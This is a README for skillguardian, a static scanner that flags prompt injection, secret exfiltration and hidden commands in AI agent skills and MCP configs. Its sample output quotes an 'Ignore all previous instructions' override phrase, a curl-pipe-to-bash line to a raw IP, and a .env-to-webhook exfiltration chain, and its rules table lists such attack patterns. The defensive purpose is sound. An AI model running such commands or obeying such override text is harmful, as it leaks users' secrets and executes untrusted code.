<div align="center">

<img src="https://raw.githubusercontent.com/hussainu6/skillguardian/main/assets/banner.svg" alt="skillguardian — security scanner for AI agent skills, plugins & MCP configs" width="100%">

<br><br>

**Catch prompt-injection, secret-exfiltration, and hidden-command patterns _before_ you install them.**

[![CI](https://github.com/hussainu6/skillguardian/actions/workflows/ci.yml/badge.svg)](https://github.com/hussainu6/skillguardian/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/skillguardian.svg)](https://www.npmjs.com/package/skillguardian)
[![npm downloads](https://img.shields.io/npm/dm/skillguardian.svg)](https://www.npmjs.com/package/skillguardian)
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![node](https://img.shields.io/badge/node-%3E%3D20-brightgreen.svg)](https://nodejs.org)

</div>

---

## Why

An AI agent skill is just a text file the agent *obeys*. A plugin or MCP server extends what the agent can do. You copy them from GitHub, gists, and registries and drop them straight into Claude Code, Cursor, and other agents — usually without reading every line.

That's a supply chain, and it has the same problem every supply chain has: **a malicious or careless component can turn your agent against you** — reading your `.env`, piping a remote script into your shell, or quietly telling the agent to skip its safety checks.

`skillguardian` reads those files the way an attacker would and flags the patterns that matter, in **one command, with zero config, no account, and no data leaving your machine.**

```bash
npx skillguardian ./path-to-skill
```

<div align="center">

```
 F  super-helper (skill) · super-helper
    CRITICAL  SS006  Attempts to override agent instructions
       SKILL.md:8   "Ignore all previous instructions…"
    CRITICAL  SS003  Executes remote or dynamic code
       SKILL.md:15  curl http://198.51.100.23/install.sh | bash
    CRITICAL  SS010  Reads secrets and sends data out
       SKILL.md:17  reads .env → POSTs to webhook.site

Summary: 5 critical  7 high  1 medium  3 low
Overall:  F   score 0/100
```

</div>

## Install

```bash
# one-off, no install
npx skillguardian .

# or add to a project
npm install -D skillguardian
```

Requires Node.js ≥ 20.

## Usage

```bash
skillguardian [path] [options]
```

| Option | Description | Default |
| --- | --- | --- |
| `path` | File or directory to scan | `.` |
| `-f, --format` | `terminal` · `json` · `sarif` · `markdown` | `terminal` |
| `-o, --output` | Write the report to a file | stdout |
| `--fail-on` | Exit non-zero at this severity or worse: `critical` `high` `medium` `low` `never` | `high` |
| `--only` | Run only these rule ids, e.g. `--only SS003,SS010` | all |
| `--skip` | Skip these rule ids | none |
| `skillguardian rules` | List every rule | |

```bash
skillguardian ./skills                       # scan a folder of skills
skillguardian . -f sarif -o skillguardian.sarif # SARIF for GitHub code scanning
skillguardian . --fail-on critical           # only fail on critical findings
skillguardian . -f json | jq '.grade'        # pipe into your own tooling
```

**Exit codes:** `0` clean or under threshold · `1` findings at/above `--fail-on` · `2` usage error.

## What it detects

Every component gets an **A–F grade** from a 0–100 risk score. One critical finding is enough to fail.

| ID | Rule | Severity |
| --- | --- | :---: |
| `SS001` | Hidden or non-printing Unicode (zero-width, bidi overrides, tag chars) | 🟧 high |
| `SS002` | Reads secrets or credential stores (`.env`, SSH/cloud keys, tokens) | 🟨 medium |
| `SS003` | Executes remote or dynamic code (`curl … \| bash`, `eval`, `exec`) | 🟥 critical |
| `SS004` | Obfuscated or encoded payload (base64/hex decode-and-run) | 🟧 high |
| `SS005` | Sends data to an external drop point (paste sites, webhooks, raw IPs) | 🟧 high |
| `SS006` | Attempts to override agent instructions (jailbreak / prompt injection) | 🟥 critical |
| `SS007` | Disables safety guardrails (auto-approve, `--no-sandbox`, `*` allow-lists) | 🟧 high |
| `SS008` | Claims false authority or pressures the user | 🟦 low |
| `SS009` | Runs destructive or irreversible commands (`rm -rf`, force-push, `DROP`) | 🟧 high |
| `SS010` | **Reads secrets *and* sends data out** — a complete exfiltration chain | 🟥 critical |

`SS010` is the one that matters most: it fires only when a *single component* both touches secrets and has a network egress path. Skills that look innocent rule-by-rule get caught by the combination.

## GitHub Action

Scan every pull request and see findings on the **Security** tab and inline on the diff:

```yaml
# .github/workflows/skillguardian.yml
name: skillguardian
on: [pull_request, push]
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v5
      - uses: hussainu6/skillguardian@v0
        with:
          path: .
          fail-on: high
```

| Input | Description | Default |
| --- | --- | --- |
| `path` | File or directory to scan | `.` |
| `fail-on` | `critical` `high` `medium` `low` `never` | `high` |
| `format` | `sarif` `json` `markdown` | `sarif` |
| `output-file` | Report path | `skillguardian.sarif` |
| `upload-sarif` | Upload to GitHub code scanning | `true` |

## Programmatic API

```ts
import { scan } from "skillguardian";

const report = scan("./my-skill");
console.log(report.grade, report.score);        // "A" 100
for (const c of report.components)
  for (const f of c.findings)
    console.log(f.ruleId, f.severity, f.file, f.message);
```

## How it works (and its limits)

`skillguardian` is a **static, pattern-based** scanner. It reads files as text and matches known-dangerous shapes; it does **not** execute anything it scans, and it never starts your MCP servers.

That means:

- ✅ Fast, offline, safe to run on untrusted files, no account.
- ⚠️ It catches known patterns, not novel or heavily obfuscated attacks. A clean report is **not** a guarantee — it's a fast first filter that removes the obvious and the careless.
- ⚠️ Some rules (like `SS008`) are *signals*, not proof. A real vendor skill may legitimately trip them.

Use it as one layer. Still read skills you grant real power to.

## Contributing

New detection rules are the most valuable contribution. A rule is one small file that exports a `Rule`; see [`src/rules/`](src/rules/) and [CONTRIBUTING.md](CONTRIBUTING.md). Found a pattern in the wild? Open an issue with a **defanged** example.

Found something malicious in a *public* skill? Please **don't** name-and-shame — see [SECURITY.md](SECURITY.md) for responsible disclosure.

## License

[MIT](LICENSE) © Uzair Hussain
